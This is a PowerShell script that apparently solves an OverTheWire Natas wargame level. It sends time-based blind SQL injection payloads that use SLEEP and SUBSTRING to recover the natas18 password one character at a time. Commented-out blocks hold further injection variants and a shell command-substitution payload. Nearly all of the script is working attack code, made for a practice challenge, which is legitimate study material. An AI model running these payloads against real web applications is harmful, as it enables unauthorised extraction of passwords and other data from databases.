param (
    [Parameter(Mandatory=$true)]
    [string]$server,
    [Parameter(Mandatory=$true)]
    [string]$username,
    [Parameter(Mandatory=$true)]
    [string]$password
)
$url = $server

$pair = "${username}:${password}"
$bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
$base64 = [System.Convert]::ToBase64String($bytes)
$authorization = "Basic $base64"

$headers = @{
    "Authorization" = $authorization
    "Content-Type"  = "application/x-www-form-urlencoded"
} 

$lowercaseChars = 97..122 | ForEach-Object { [char]$_ }
$uppercaseChars = 65..90 | ForEach-Object { [char]$_ }
$numbers = 48..57 | ForEach-Object { [char]$_ }

$all_characters = $lowercaseChars + $uppercaseChars + $numbers

$result = ""
<#for ($position = 1; $position -le 32; $position ++) {    
    
    foreach ($char in $all_characters) {  	 

        $command = '$(bash /tmp/myb64decoded ' + $char + ' ' + $position + ' ' + $FileName + ')'
        $response = Invoke-WebRequest -URI $url -Headers $headers -Method 'GET' -UseBasicParsing $command

        if ($response) {
            if ($response.Content -like "*$correctStr*") {
                if ($response.Content -notlike "*$wrongStr*") {
                    $result += $char
                    Write-Host "Char $position" + ": $char"
                    break
                }
            }
        }
    }
}#>


# SELECT * from users where username="
#" OR IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(5), 0)--

<#
    $char = SUBSTRING(username, 1, 1)
    '" OR IF(SUBSTRING(' + $position + ', 1) = "'+$char+'", SLEEP(2), 0)--%20'

    
    '" OR (username = "natas18" and IF(SUBSTRING(password, ' + $position + ', 1) = "natas18", SLEEP(2), 0)-- -

#>

#'" OR IF(SUBSTRING(username, 1, 1) = "n", SLEEP(2), 0)-- -'
$url += "&username=natas18"
$result = ""
for ($position = 1; $position -le 32; $position ++) {    
    Write-Host "`nPosition: $position"
    foreach ($char in $all_characters) {  	 
        #3:
        #just do Send-Command -command $command -char $character
        
        $cmdURL = $url + '" and IF(BINARY SUBSTRING(password, ' + $position + ', 1) = "' + $char + '", SLEEP(5), 0)-- -'
        $start = Get-Date
        $response = Invoke-WebRequest -URI $cmdURL -Headers $headers -Method 'GET' -UseBasicParsing 
        $end = Get-Date
        if ($response) {
            if (($end - $start).TotalMilliseconds -ge 5000) {
                Write-Host "--- It is: Char $char"
                $result += $char
                break
            }
        }
    }
    if (!$result) {
        write-host "got nothing"
        exit
    }
}

write-host `n"PASSWORD: $result"


